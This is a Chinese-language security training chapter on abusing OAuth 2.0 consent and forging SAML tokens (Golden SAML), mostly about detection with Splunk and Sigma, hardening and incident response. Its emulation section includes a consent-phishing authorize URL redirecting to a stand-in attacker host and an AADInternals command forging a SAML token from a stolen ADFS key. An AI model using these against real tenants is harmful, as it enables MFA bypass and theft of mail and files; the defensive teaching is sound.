# 13.1 雲端與現代身分驗證協定濫用：OAuth 2.0 與 SAML 權杖偽造分析 (OAuth 2.0 & SAML Token Abuse)

## 案發現場破題

隨著現代企業全面擁抱混合雲（Hybrid Identity）與 SaaS 應用（如 Microsoft 365, Google Workspace, AWS IAM Identity Center），身分驗證核心已由傳統的 Kerberos/NTLM 轉移至 OAuth 2.0、OpenID Connect (OIDC) 與 SAML 2.0 協定。然而，攻擊者不再局限於破解或竊取靜態密碼，而是將目標鎖定在「權杖（Token）層級的劫持、重放與偽造」，如惡名昭彰的「Golden SAML」與「Illicit OAuth Consent Grant（惡意 OAuth 授權應用程式）」。

```
[攻擊者 / 惡意應用程式]
        │
        ├── 1. 誘騙點擊授權連結 / 釣魚 Consent Phishing
        ▼
[雲端身分提供者 IdP (Entra ID / Okta)]
        │
        ├── 2. 簽發 Access Token / Refresh Token (擁有 Mail.ReadWrite, Files.ReadWrite.All)
        ▼
[攻擊者控制之惡意背景服務]
        │
        └── 3. 無需受害者密碼、繞過 MFA，持續存取企業雲端郵件與機密文件
```

### 痛點場景
- **完全繞過多因素驗證（MFA Bypass by Design）**：攻擊者一旦取得簽發之 OAuth Refresh Token 或偽造出有效 SAML Assertion，即可長驅直入存取後端 API，全程不觸發任何二次身分驗證。
- **持續性後門極其隱匿**：惡意 OAuth App 可以在受害者完全不知情的情況下，長期常駐於企業租戶（Tenant）內，即便使用者後續重設網域密碼，OAuth Token 依然有效。
- **日誌量龐大且難以精準關聯**：雲端身分日誌（如 Microsoft Entra AuditLogs / SignInLogs）每日產出數十萬筆，資安人員常難以分辨正常第三方 SaaS 串接與惡意授權存取。

## 第一動：協定原理與權杖結構解析 (OAuth 2.0 vs. SAML 2.0 Architecture)

現代身分同盟架構主要依賴身分提供者（Identity Provider, IdP）與服務提供者（Service Provider, SP）之間的信任關係。

```
+-----------------------------------------------------------------------------------------------+
| OAuth 2.0 / OIDC 授權架構                                                                     |
|                                                                                               |
|  [ Resource Owner ] (使用者)  ──授權──► [ Client App ] (用戶端應用程式)                       |
|           │                                      ▲                                            |
|        身分驗證                               取得 Token                                      |
|           ▼                                      │                                            |
|  [ Authorization Server / IdP ] ─────────────────┘                                            |
|           │                                                                                   |
|      (簽發 JWT) ──► Header: {"alg": "RS256", "typ": "JWT"}                                    |
|                    Payload: {"sub": "user@corp.com", "scp": "Mail.Read", "exp": 1720000000}  |
|                    Signature: RSA-SHA256(Header + Payload, IdP_PrivateKey)                   |
+-----------------------------------------------------------------------------------------------+
```

### 關鍵威脅利用手法

| 協定 / 機制 | 攻擊手法名稱 | 威脅利用原理與特徵 (Mechanism & Impact) |
| :--- | :--- | :--- |
| **OAuth 2.0** | **Illicit Consent Grant** (惡意應用程式同意授權) | 誘騙使用者點擊包含高權限範圍（Scope: `Mail.ReadWrite`, `User.ReadWrite.All`）的授權確認頁面，直接取得長期 Refresh Token。 |
| **OAuth 2.0** | **Redirect URI 弱匹配劫持** | 利用授權伺服器未嚴格驗證重導向 URI（萬用字元 `*` 或子網域未過濾），將 Authorization Code 導向攻擊者主機。 |
| **SAML 2.0** | **Golden SAML (T1606.002)** | 攻擊者竊取 ADFS 權杖簽署私鑰（Token Signing Certificate），在本地端任意偽造具有 Domain Admin 特權的 SAML Assertion，直取所有雲端服務。 |
| **SAML 2.0** | **SAML XML Signature Wrapping (XSW)** | 竄改 SAML Response 的 XML DOM 結構，使驗證器檢查合法簽名，但業務邏輯卻解析由攻擊者注入的偽造身分斷言。 |

## 第二動：攻擊鏈模擬與滲透情境重現 (Attack Emulation: Golden SAML & Illicit App)

### 1. 惡意 OAuth 應用程式授權流程 (Consent Phishing)
攻擊者建立名為「IT Support Portal」的 Azure AD 多租戶應用程式，並誘使使用者點擊以下授權 URL：
```http
GET /common/oauth2/v2.0/authorize?
client_id=d3b07384-d113-494a-a000-000000000000
&response_type=code
&redirect_uri=https://attacker-c2.com/oauth/callback
&response_mode=query
&scope=offline_access%20Mail.ReadWrite%20Files.ReadWrite.All
&state=xyz123 HTTP/1.1
Host: login.microsoftonline.com
```

### 2. Golden SAML 離線偽造斷言利用
若攻擊者入侵本機 ADFS 伺服器並使用工具（如 AADInternals 或 Mimikatz）匯出 ADFS 私鑰與憑證：
```powershell
# 使用 AADInternals 建立偽造之 SAML 權杖直接登入雲端 Microsoft 365
$cert = Get-PfxCertificate -FilePath "C:\adfs_signing.pfx"
New-AADIntSAMLToken -ImmutableId "CEO-AD-GUID-001" -PfxFileName "C:\adfs_signing.pfx" -Issuer "http://corp.local/adfs/services/trust"
```

## 第三動：日誌遙測收集與審計配置 (Telemetry Setup: Entra ID & ADFS)

要有效偵測 OAuth 與 SAML 濫用，必須將身分提供者的審計日誌與登入日誌即時串流至 SIEM：

### 1. Microsoft Entra ID 審計日誌串流設定
確保 Diagnostic Settings 將下列類別轉發至 Log Analytics / Event Hub：
- **`AuditLogs`**：包含應用程式註冊、權限委派同意（`Consent to application`）、新增憑證金鑰。
- **`SignInLogs`**：使用者互動式登入日誌。
- **`NonInteractiveUserSignInLogs`**：權杖更新、背景 API 呼叫。
- **`ServicePrincipalSignInLogs`**：應用程式身分驗證。

### 2. ADFS 本機安全日誌配置
在 ADFS 伺服器上開啟稽核：
- **Event ID 1200 / 1202**：成功或失敗簽發 SAML 權杖。
- **Event ID 403**：ADFS 服務憑證遭存取或讀取。
- **Security Event ID 4663**：存取 ADFS 金鑰容器（ADFS Certificate Store CNG/CryptoAPI）。

## 第四動：SIEM 關聯規則與即時威脅獵捕 (Splunk SPL & Sigma Detection)

### 1. Splunk SPL：偵測使用者授權高危險 OAuth 應用程式 (Illicit Consent)
```spl
index=azure_ad sourcetype="azure:aad:audit" OperationName="Consent to application"
| spath path="TargetResources{}.modifiedProperties{}" output=props
| eval Permissions=mvfilter(match(props, "ReadWrite\.All|Mail\.|Directory\.ReadWrite"))
| search Permissions=*
| stats count earliest(_time) as first_consent latest(_time) as last_consent 
    values(InitiatedBy.user.userPrincipalName) as TargetUser 
    values(TargetResources{}.displayName) as AppName 
    values(Permissions) as DangerousScopes by correlationId
| convert ctime(first_consent) ctime(last_consent)
```

### 2. Splunk SPL：偵測 Golden SAML 異常登入（雲端登入但無 ADFS 簽發對應）
```spl
index=azure_ad sourcetype="azure:aad:signin" AuthenticationProcessingDetails{}.key="Federation"
| eval FederatedUser=UserPrincipalName, CloudSignTime=_time
| join type=left FederatedUser [
    search index=windows sourcetype="ActiveDirectory:FederationService" EventCode=1200
    | eval FederatedUser=TargetUser, AdfsSignTime=_time
    | fields FederatedUser, AdfsSignTime
  ]
| eval TimeDiff=abs(CloudSignTime - AdfsSignTime)
| where isnull(AdfsSignTime) OR TimeDiff > 300
| table _time, UserPrincipalName, IPAddress, ClientAppUsed, TimeDiff
```

### 3. Sigma 偵測規則：New High-Privilege OAuth App Consent
```yaml
title: High Privilege OAuth Application Consent Granted
id: 9d748f21-36bb-4ec5-901d-7216a69528bc
status: production
description: 偵測使用者或管理員授權具有完全讀寫權限之第三方 OAuth 應用程式
logsource:
    product: azure
    service: auditlogs
detection:
    selection:
        OperationName: 'Consent to application'
        Result: 'success'
    scope_filter:
        TargetResources.modifiedProperties.NewValue|contains:
            - 'Mail.ReadWrite'
            - 'Files.ReadWrite.All'
            - 'RoleManagement.ReadWrite.Directory'
    condition: selection and scope_filter
falsepositives:
    - 經資安架構師審核合格之內部企業 SaaS 系統整合
level: high
```

## 第五動：身分防禦收斂與零信任條件存取 (Zero Trust Hardening & Mitigation)

```
[使用者發起連線] ──► [條件存取評估引擎 (Conditional Access)]
                             │
                             ├── 1. 裝置相符性檢驗 (Intune Compliant Device)
                             ├── 2. 身分保護風險評估 (User Risk == Low)
                             ├── 3. 嚴格 FIDO2 / 憑證式身分驗證 (Phishing-Resistant MFA)
                             ▼
                    [允許 / 簽發受保護之短期權杖 (1 Hour)]
```

### 1. 關閉一般使用者自行同意第三方應用程式權限 (Disable User Consent)
在 Entra ID「企業應用程式」設定中：
- 將「使用者同意使用應用程式」設為 **「不允許使用者同意」**。
- 啟用「管理員同意工作流程（Admin Consent Workflow）」，所有第三方 App 整合必須由資安審查小組核准。

### 2. 實施條件式存取原則 (Conditional Access Policy)
- **Token Protection for Sign-ins (Proof-of-Possession)**：綁定 Token 至特定受信任硬體端點（TPM），防止 Token 遭竊取後重放於攻擊者主機。
- **嚴格縮短權杖存活時間**：停用永久有效 Refresh Token，要求週期性重新驗證裝置合規狀態。

### 3. PowerShell 自動化廢除遭濫用之 OAuth 授權
```powershell
Import-Module Microsoft.Graph.Applications

$MaliciousAppId = "d3b07384-d113-494a-a000-000000000000"

# 查詢所有對該惡意應用程式簽發的 OAuth2 授權
$Grants = Get-MgOAuth2PermissionGrant -Filter "clientId eq '$MaliciousAppId'"

foreach ($Grant in $Grants) {
    Remove-MgOAuth2PermissionGrant -OAuth2PermissionGrantId $Grant.Id
    Write-Host "[!] 已成功廢除帳號權限授權: $($Grant.PrincipalId)" -ForegroundColor Yellow
}

# 廢止特定受害者帳號的所有有效連線 Session
Revoke-MgUserSignInSession -UserId "victim@corp.com"
Write-Host "[+] 成功撤銷受害者所有已發出之 Refresh Tokens！" -ForegroundColor Green
```

## 靶場實戰：OAuth 惡意授權鑑識調查與處置

### 靶場環境情境
- **企業租戶**: `corp.onmicrosoft.com`
- **受害帳號**: `hr_recruiter@corp.com` (HR 人資主管)
- **警報觸發**: SOC 監控系統偵測到 HR 帳號之 Exchange 郵件轉寄規則（Inbox Rule）被修改，且出現異常國外 IP 透過 Graph API 下載數百份履歷與薪資表。

### 實戰步驟一：審查授權應用程式清單
1. 調閱 AuditLogs，過濾該帳號近 7 日內的 `Consent to application` 事件。
2. 發現帳號曾同意名為「Resume Parser AI」的未驗證發行者應用程式，其要求的權限範圍包含 `Mail.ReadWrite` 與 `offline_access`。

### 實戰步驟二：權杖撤銷與隔離阻斷
1. 立即利用 Microsoft Graph PowerShell 刪除「Resume Parser AI」的 Service Principal 與 OAuth2PermissionGrant。
2. 執行 `Revoke-MgUserSignInSession` 強制失效所有已簽發的 JWT/Refresh Token。
3. 檢查並清除受害者信箱中的惡意隱藏轉寄規則：
   ```powershell
   Get-InboxRule -Mailbox "hr_recruiter@corp.com" | Remove-InboxRule -Confirm:$false
   ```

### 實戰步驟三：防禦架構升級
1. 將該租戶的 User Consent 原則調整為強制管理員同意。
2. 配置條件式存取：非公司列管 Intune 裝置禁止存取 Exchange Online API。

## 過關驗收：實戰能力檢核清單 (Mastery Checklist)

- [ ] **協定原理**：能精準區分 OAuth 2.0 授權碼模式（Authorization Code Grant）、SAML 斷言簽章與 JWT Token 結構（Header, Payload, Signature）。
- [ ] **威脅手法**：熟知 Golden SAML 攻擊的前提條件（ADFS 私鑰外洩）與惡意 OAuth 同意授權（Illicit Consent Grant）的攻擊鏈。
- [ ] **審計關聯**：能撰寫 Splunk / Log Analytics 查詢，比對 Cloud SignInLogs 與 ADFS 本機日誌，快速篩選出缺少對應簽發事件的偽造 SAML 存取。
- [ ] **事件處置**：能使用 Microsoft Graph SDK 快速鎖定惡意 App、撤回 OAuth2PermissionGrant 並廢除特定使用者之全域 Session。
- [ ] **治理加固**：能正確在企業雲端身分租戶落實 Admin Consent 工作流與 Token Binding 防護機制。
